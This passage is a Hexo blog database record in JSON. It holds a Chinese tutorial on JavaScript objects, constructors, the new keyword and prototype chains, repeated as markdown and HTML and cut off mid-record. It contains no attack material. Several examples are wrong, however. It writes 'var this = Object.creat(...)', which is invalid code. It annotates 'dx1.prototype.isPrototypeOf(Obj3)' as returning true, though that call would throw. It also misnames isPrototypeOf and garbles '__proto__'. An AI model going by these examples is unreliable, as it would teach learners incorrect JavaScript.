JavasCript\nabbrlink: 8814181e\n---\n\n### 对象\n\n概念：首先，对象是`JavaScript`中的一个基本数据类型，是一种复合值；它用一个（对象）名字命名，把一系列的属性和方法都包装在一个集合中，可以对象名访问这些属性和方法，即属性的无序集合。\n\n#### 通过字面量创建对象\n\n```javascript\n//通过字面量创建对象\nvar obj1 = {\n        name:'Jack',\n        age: 18\n      }\n```\n\n#### 通过系统自带的构造函数构造对象\n\n```JavaScript\n// 通过系统自带的构造函数构造对象\n// 其他构造函数有：new Array(),new Number,new Date(),new Boolean()\n var obj2 = new Object();\n obj2.name = 'Jack';\n obj2.age = 18;\n```\n\n#### 通过自定义函数构造对象\n\n```javascript\n// 通过自定义函数构造对象\n// 为了和普通函数区别，构造函数命名首字母要大写（帕斯卡命名法）\n    function Obj3(name,age) {\n      this.name = name;\n      this.age = age;\n      this.sayHi = function () {\n        alert(this.name)\n      };\n    }\n    var dx1 = new Obj3('Jack', 18);\n    var dx2 = new Obj3('Brush', 18);\n```\n\n####  new关键字\n\n首先，我先说下自定义构造函数创建对象的基本流程，使用new和不适用new差别很大，不用new的话，则`Obj3(name)`就作为一个普通的函数执行（只是函数名的首字母大写了），没有返回值，那么默认返回的是`undefined`，而用`new`关键字后，JS就会把该函数作为一个构造函数看待，经过一系列的隐式操作，返回值是一个对象了。\n\nnew关键字的“隐式操作”：\n\n①在内存中创建一个空的Object类型的对象----看不到\n\n②让this关键字指向这个空的对象（将构造函数的作用域赋给新对象）----看不到\n\n```javascript\n// ① ② 的执行过程\nvar this = Object.creat(Obj3.prototype);\n// this 指向 Obj3.prototype(后面讲到)\n// 可以看出构造函数创建对象的最根本原理是借用Object.create()方法来实现的，只不过被封装功能化了\n```\n\n在前面的例子中，`dx1`和`dx2`分别保存着`Obj3`的一个不同的实例。这俩个对象都有有一个`constructor`（构造函数）的属性，该属性指向`Obj3`，如下：\n\n```javascript\nconsole.log(dx1.constructor  == Obj3) // true\nconsole.log(dx2.constructor  == Obj3) // true\n```\n\n对象的constructor属性最初用来表示对象类型的。但是，检测对象类型，还是`instanceof`操作符要更可靠一些-----用来检测一个对象在其原型链中，是否存在一个构造函数的`prototype`属性。\n\n我们在这个例子中创建的所有对象即使`Object`的实例，同时也是`Obj3`的实例，这一点可以通过`instanceof`操作符可以得到验证。\n\n```javascript\n    console.log(dx1 instanceof Obj3);  // true\n    console.log(dx1 instanceof Object);  // true\n    console.log(dx2 instanceof Obj3);  // true\n    console.log(dx2 instanceof Object);  // true\n // dx1 和 dx2 之所以同时是Object的实例，是因为所有的对象均继承自Object\n```\n\n③通过this给这个对象添加属性和方法---看得见\n\n```javascript\n// this.name = 'Jack';\n   this.age = 18;\n```\n\n④将这个对象返回给用`new`关键字调用的构造函数`Obj3(name)`的调用者（`dx1`）\n\n```javascript\nreturn this;\n```\n\n注：`Object`在JS中，所有不同类型的对象，都直接或间接的集成于它。\n\n\n\n### 原型对象和原型链\n\n#### 原型\n\n我们所创建的每一个函数都有一个 prototype （原型）的属性，这个属性是一个指针，指向一个对象，而这个对象的用途包含可以由特定类型的所有实例共享的属性和方法。 \n\n那么prototype就可以通过调用构造函数而创建的那个对象实例的原型对象。使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中第一对象实例的信息，而是可以将这些信息直接添加到原型对象中去，那么上面的Obj3（）函数就可以写成这样：\n\n```javascript\n    function Obj3(name,age) {\n      this.name = name;\n      this.age = age;\n    }\n\tObj3.prototype.sayHi = function () {\n      alert(this.name)\n\t}\n    var dx1 = new Obj3('Jack', 18);\n    var dx2 = new Obj3('Brush', 18);\n```\n\n在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针。就拿上面的例子来说，Obj3.prototype.constructor指向Obj3。而通过这个构造函数，我们还可以继续为原型对象添加其他属性和方法。\n\n当构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型方法。在每一个对象都支持一个属性：\"_ _proto_ _\"。\n\n我们可以通过isPrototype()方法来确定对象之间是否存在这个关系。从本质上讲，如果[Prototype]指向调用isPrototype()方法的对象（Obj3.prototype），那么这个方法就返回true：\n\n```javascript\n    console.log(dx1.prototype.isPrototypeOf(Obj3)); // true\n    console.log(dx2.prototype.isPrototypeOf(Obj3)); // true\n```\n\n使用hasOwnProperty()可以检测一个属性是否存在在实例中，还是存在在原型中。这个方法（从Object继承来的）只是给定属性存在在对象实例中，才会返回true；存在在原型中，返回false。\n\n####  原型对象的原型\n\n所有的原型应用类型（Object、Array、String）都在其构造函数的原型上定义了方法。在Array.prototype中可以找到sort（）方法；在String.prototype中可以找到substring（）方法，如下：\n\n```javascript\n console.log(Array.prototype.sort); // ƒ sort() { [native code] }\n console.log(String.prototype.substring); // ƒ substring() { [native code] }\n```\n\n### 原型链\n\n原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。如果，我们让这个原型对象等于另一个类型的实例，显然，此时的原型对象包含一个指向另一个原型的指针，相应的，另一个原型中野包含着指向另另一个类型的实例，那么，层层递进，就构成了实例与原型的链条，这就是原型链的基本概念。\n\n我们知道，所有引用类型默认都继承了Object，而这个继承也是通过原型链实现的。所有函数的默认原型都是Object的实例，因此默认原型都包含一个内部指针，指向`Object.prototype`。这正是所有自定义类型都会继承`toString()、valueOf()`等默认方式的根本原因。\n\n![原型](/js中的原型及原型链/prototype.jpg)\n","slug":"js中的原型及原型链","published":1,"date":"2020-06-18T07:09:21.435Z","updated":"2020-06-18T07:09:21.436Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u350006qrwtv7tt9ysr","content":"<h3 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h3><p>概念：首先，对象是<code>JavaScript</code>中的一个基本数据类型，是一种复合值；它用一个（对象）名字命名，把一系列的属性和方法都包装在一个集合中，可以对象名访问这些属性和方法，即属性的无序集合。</p>\n<h4 id=\"通过字面量创建对象\"><a href=\"#通过字面量创建对象\" class=\"headerlink\" title=\"通过字面量创建对象\"></a>通过字面量创建对象</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//通过字面量创建对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj1 = &#123;</span><br><span class=\"line\">        name:<span class=\"string\">'Jack'</span>,</span><br><span class=\"line\">        age: <span class=\"number\">18</span></span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"通过系统自带的构造函数构造对象\"><a href=\"#通过系统自带的构造函数构造对象\" class=\"headerlink\" title=\"通过系统自带的构造函数构造对象\"></a>通过系统自带的构造函数构造对象</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过系统自带的构造函数构造对象</span></span><br><span class=\"line\"><span class=\"comment\">// 其他构造函数有：new Array(),new Number,new Date(),new Boolean()</span></span><br><span class=\"line\"> <span class=\"keyword\">var</span> obj2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>();</span><br><span class=\"line\"> obj2.name = <span class=\"string\">'Jack'</span>;</span><br><span class=\"line\"> obj2.age = <span class=\"number\">18</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"通过自定义函数构造对象\"><a href=\"#通过自定义函数构造对象\" class=\"headerlink\" title=\"通过自定义函数构造对象\"></a>通过自定义函数构造对象</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过自定义函数构造对象</span></span><br><span class=\"line\"><span class=\"comment\">// 为了和普通函数区别，构造函数命名首字母要大写（帕斯卡命名法）</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Obj3</span>(<span class=\"params\">name,age</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.sayHi = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name)</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> dx1 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Jack'</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> dx2 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Brush'</span>, <span class=\"number\">18</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"new关键字\"><a href=\"#new关键字\" class=\"headerlink\" title=\"new关键字\"></a>new关键字</h4><p>首先，我先说下自定义构造函数创建对象的基本流程，使用new和不适用new差别很大，不用new的话，则<code>Obj3(name)</code>就作为一个普通的函数执行（只是函数名的首字母大写了），没有返回值，那么默认返回的是<code>undefined</code>，而用<code>new</code>关键字后，JS就会把该函数作为一个构造函数看待，经过一系列的隐式操作，返回值是一个对象了。</p>\n<p>new关键字的“隐式操作”：</p>\n<p>①在内存中创建一个空的Object类型的对象—-看不到</p>\n<p>②让this关键字指向这个空的对象（将构造函数的作用域赋给新对象）—-看不到</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ① ② 的执行过程</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"keyword\">this</span> = <span class=\"built_in\">Object</span>.creat(Obj3.prototype);</span><br><span class=\"line\"><span class=\"comment\">// this 指向 Obj3.prototype(后面讲到)</span></span><br><span class=\"line\"><span class=\"comment\">// 可以看出构造函数创建对象的最根本原理是借用Object.create()方法来实现的，只不过被封装功能化了</span></span><br></pre></td></tr></table></figure>\n<p>在前面的例子中，<code>dx1</code>和<code>dx2</code>分别保存着<code>Obj3</code>的一个不同的实例。这俩个对象都有有一个<code>constructor</code>（构造函数）的属性，该属性指向<code>Obj3</code>，如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(dx1.constructor  == Obj3) <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dx2.constructor  == Obj3) <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p>对象的constructor属性最初用来表示对象类型的。但是，检测对象类型，还是<code>instanceof</code>操作符要更可靠一些—–用来检测一个对象在其原型链中，是否存在一个构造函数的<code>prototype</code>属性。</p>\n<p>我们在这个例子中创建的所有对象即使<code>Object</code>的实例，同时也是<code>Obj3</code>的实例，这一点可以通过<code>instanceof</code>操作符可以得到验证。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx1 <span class=\"keyword\">instanceof</span> Obj3);  <span class=\"comment\">// true</span></span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx1 <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Object</span>);  <span class=\"comment\">// true</span></span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx2 <span class=\"keyword\">instanceof</span> Obj3);  <span class=\"comment\">// true</span></span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx2 <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Object</span>);  <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"comment\">// dx1 和 dx2 之所以同时是Object的实例，是因为所有的对象均继承自Object</span></span><br></pre></td></tr></table></figure>\n<p>③通过this给这个对象添加属性和方法—看得见</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// this.name = 'Jack';</span></span><br><span class=\"line\">   <span class=\"keyword\">this</span>.age = <span class=\"number\">18</span>;</span><br></pre></td></tr></table></figure>\n<p>④将这个对象返回给用<code>new</code>关键字调用的构造函数<code>Obj3(name)</code>的调用者（<code>dx1</code>）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br></pre></td></tr></table></figure>\n<p>注：<code>Object</code>在JS中，所有不同类型的对象，都直接或间接的集成于它。</p>\n<h3 id=\"原型对象和原型链\"><a href=\"#原型对象和原型链\" class=\"headerlink\" title=\"原型对象和原型链\"></a>原型对象和原型链</h3><h4 id=\"原型\"><a href=\"#原型\" class=\"headerlink\" title=\"原型\"></a>原型</h4><p>我们所创建的每一个函数都有一个 prototype （原型）的属性，这个属性是一个指针，指向一个对象，而这个对象的用途包含可以由特定类型的所有实例共享的属性和方法。 </p>\n<p>那么prototype就可以通过调用构造函数而创建的那个对象实例的原型对象。使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中第一对象实例的信息，而是可以将这些信息直接添加到原型对象中去，那么上面的Obj3（）函数就可以写成这样：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Obj3</span>(<span class=\"params\">name,age</span>) </span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">     <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">Obj3.prototype.sayHi = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">     alert(<span class=\"keyword\">this</span>.name)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   <span class=\"keyword\">var</span> dx1 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Jack'</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">   <span class=\"keyword\">var</span> dx2 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Brush'</span>, <span class=\"number\">18</span>);</span><br></pre></td></tr></table></figure>\n<p>在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针。就拿上面的例子来说，Obj3.prototype.constructor指向Obj3。而通过这个构造函数，我们还可以继续为原型对象添加其他属性和方法。</p>\n<p>当构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型方法。在每一个对象都支持一个属性：”_ <em>proto</em> _”。</p>\n<p>我们可以通过isPrototype()方法来确定对象之间是否存在这个关系。从本质上讲，如果[Prototype]指向调用isPrototype()方法的对象（Obj3.prototype），那么这个方法就返回true：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(dx1.prototype.isPrototypeOf(Obj3)); <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dx2.prototype.isPrototypeOf(Obj3)); <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p>使用hasOwnProperty()可以检测一个属性是否存在在实例中，还是存在在原型中。这个方法（从Object继承来的）只是给定属性存在在对象实例中，才会返回true；存在在原型中，返回false。</p>\n<h4 id=\"原型对象的原型\"><a href=\"#原型对象的原型\" class=\"headerlink\" title=\"原型对象的原型\"></a>原型对象的原型</h4><p>所有的原型应用类型（Object、Array、String）都在其构造函数的原型上定义了方法。在Array.prototype中可以找到sort（）方法；在String.prototype中可以找到substring（）方法，如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">Array</span>.prototype.sort); <span class=\"comment\">// ƒ sort() &#123; [native code] &#125;</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">String</span>.prototype.substring); <span class=\"comment\">// ƒ substring() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原型链\"><a href=\"#原型链\" class=\"headerlink\" title=\"原型链\"></a>原型链</h3><p>原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。如果，我们让这个原型对象等于另一个类型的实例，显然，此时的原型对象包含一个指向另一个原型的指针，相应的，另一个原型中野包含着指向另另一个类型的实例，那么，层层递进，就构成了实例与原型的链条，这就是原型链的基本概念。</p>\n<p>我们知道，所有引用类型默认都继承了Object，而这个继承也是通过原型链实现的。所有函数的默认原型都是Object的实例，因此默认原型都包含一个内部指针，指向<code>Object.prototype</code>。这正是所有自定义类型都会继承<code>toString()、valueOf()</code>等默认方式的根本原因。</p>\n<p><img src=\"/view/posts/8814181e/prototype.jpg\" alt=\"原型\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h3><p>概念：首先，对象是<code>JavaScript</code>中的一个基本数据类型，是一种复合值；它用一个（对象）名字命名，把一系列的属性和方法都包装在一个集合中，可以对象名访问这些属性和方法，即属性的无序集合。</p>\n<h4 id=\"通过字面量创建对象\"><a href=\"#通过字面量创建对象\" class=\"headerlink\" title=\"通过字面量创建对象\"></a>通过字面量创建对象</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//通过字面量创建对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj1 = &#123;</span><br><span class=\"line\">        name:<span class=\"string\">'Jack'</span>,</span><br><span class=\"line\">        age: <span class=\"number\">18</span></span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"通过系统自带的构造函数构造对象\"><a href=\"#通过系统自带的构造函数构造对象\" class=\"headerlink\" title=\"通过系统自带的构造函数构造对象\"></a>通过系统自带的构造函数构造对象</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过系统自带的构造函数构造对象</span></span><br><span class=\"line\"><span class=\"comment\">// 其他构造函数有：new Array(),new Number,new Date(),new Boolean()</span></span><br><span class=\"line\"> <span class=\"keyword\">var</span> obj2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>();</span><br><span class=\"line\"> obj2.name = <span class=\"string\">'Jack'</span>;</span><br><span class=\"line\"> obj2.age = <span class=\"number\">18</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"通过自定义函数构造对象\"><a href=\"#通过自定义函数构造对象\" class=\"headerlink\" title=\"通过自定义函数构造对象\"></a>通过自定义函数构造对象</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过自定义函数构造对象</span></span><br><span class=\"line\"><span class=\"comment\">// 为了和普通函数区别，构造函数命名首字母要大写（帕斯卡命名法）</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Obj3</span>(<span class=\"params\">name,age</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.sayHi = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name)</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> dx1 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Jack'</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> dx2 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Brush'</span>, <span class=\"number\">18</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"new关键字\"><a href=\"#new关键字\" class=\"headerlink\" title=\"new关键字\"></a>new关键字</h4><p>首先，我先说下自定义构造函数创建对象的基本流程，使用new和不适用new差别很大，不用new的话，则<code>Obj3(name)</code>就作为一个普通的函数执行（只是函数名的首字母大写了），没有返回值，那么默认返回的是<code>undefined</code>，而用<code>new</code>关键字后，JS就会把该函数作为一个构造函数看待，经过一系列的隐式操作，返回值是一个对象了。</p>\n<p>new关键字的“隐式操作”：</p>\n<p>①在内存中创建一个空的Object类型的对象—-看不到</p>\n<p>②让this关键字指向这个空的对象（将构造函数的作用域赋给新对象）—-看不到</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ① ② 的执行过程</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"keyword\">this</span> = <span class=\"built_in\">Object</span>.creat(Obj3.prototype);</span><br><span class=\"line\"><span class=\"comment\">// this 指向 Obj3.prototype(后面讲到)</span></span><br><span class=\"line\"><span class=\"comment\">// 可以看出构造函数创建对象的最根本原理是借用Object.create()方法来实现的，只不过被封装功能化了</span></span><br></pre></td></tr></table></figure>\n<p>在前面的例子中，<code>dx1</code>和<code>dx2</code>分别保存着<code>Obj3</code>的一个不同的实例。这俩个对象都有有一个<code>constructor</code>（构造函数）的属性，该属性指向<code>Obj3</code>，如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(dx1.constructor  == Obj3) <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dx2.constructor  == Obj3) <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p>对象的constructor属性最初用来表示对象类型的。但是，检测对象类型，还是<code>instanceof</code>操作符要更可靠一些—–用来检测一个对象在其原型链中，是否存在一个构造函数的<code>prototype</code>属性。</p>\n<p>我们在这个例子中创建的所有对象即使<code>Object</code>的实例，同时也是<code>Obj3</code>的实例，这一点可以通过<code>instanceof</code>操作符可以得到验证。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx1 <span class=\"keyword\">instanceof</span> Obj3);  <span class=\"comment\">// true</span></span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx1 <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Object</span>);  <span class=\"comment\">// true</span></span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx2 <span class=\"keyword\">instanceof</span> Obj3);  <span class=\"comment\">// true</span></span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(dx2 <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Object</span>);  <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"comment\">// dx1 和 dx2 之所以同时是Object的实例，是因为所有的对象均继承自Object</span></span><br></pre></td></tr></table></figure>\n<p>③通过this给这个对象添加属性和方法—看得见</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// this.name = 'Jack';</span></span><br><span class=\"line\">   <span class=\"keyword\">this</span>.age = <span class=\"number\">18</span>;</span><br></pre></td></tr></table></figure>\n<p>④将这个对象返回给用<code>new</code>关键字调用的构造函数<code>Obj3(name)</code>的调用者（<code>dx1</code>）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br></pre></td></tr></table></figure>\n<p>注：<code>Object</code>在JS中，所有不同类型的对象，都直接或间接的集成于它。</p>\n<h3 id=\"原型对象和原型链\"><a href=\"#原型对象和原型链\" class=\"headerlink\" title=\"原型对象和原型链\"></a>原型对象和原型链</h3><h4 id=\"原型\"><a href=\"#原型\" class=\"headerlink\" title=\"原型\"></a>原型</h4><p>我们所创建的每一个函数都有一个 prototype （原型）的属性，这个属性是一个指针，指向一个对象，而这个对象的用途包含可以由特定类型的所有实例共享的属性和方法。 </p>\n<p>那么prototype就可以通过调用构造函数而创建的那个对象实例的原型对象。使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中第一对象实例的信息，而是可以将这些信息直接添加到原型对象中去，那么上面的Obj3（）函数就可以写成这样：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Obj3</span>(<span class=\"params\">name,age</span>) </span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">     <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">Obj3.prototype.sayHi = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">     alert(<span class=\"keyword\">this</span>.name)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   <span class=\"keyword\">var</span> dx1 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Jack'</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">   <span class=\"keyword\">var</span> dx2 = <span class=\"keyword\">new</span> Obj3(<span class=\"string\">'Brush'</span>, <span class=\"number\">18</span>);</span><br></pre></td></tr></table></figure>\n<p>在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针。就拿上面的例子来说，Obj3.prototype.constructor指向Obj3。而通过这个构造函数，我们还可以继续为原型对象添加其他属性和方法。</p>\n<p>当构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型方法。在每一个对象都支持一个属性：”_ <em>proto</em> _”。</p>\n<p>我们可以通过isPrototype()方法来确定对象之间是否存在这个关系。从本质上讲，如果[Prototype]指向调用isPrototype()方法的对象（Obj3.prototype），那么这个方法就返回true：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(dx1.prototype.isPrototypeOf(Obj3)); <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(dx2.prototype.isPrototypeOf(Obj3)); <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p>使用hasOwnProperty()可以检测一个属性是否存在在实例中，还是存在在原型中。这个方法（从Object继承来的）只是给定属性存在在对象实例中，才会返回true；存在在原型中，返回false。</p>\n<h4 id=\"原型对象的原型\"><a href=\"#原型对象的原型\" class=\"headerlink\" 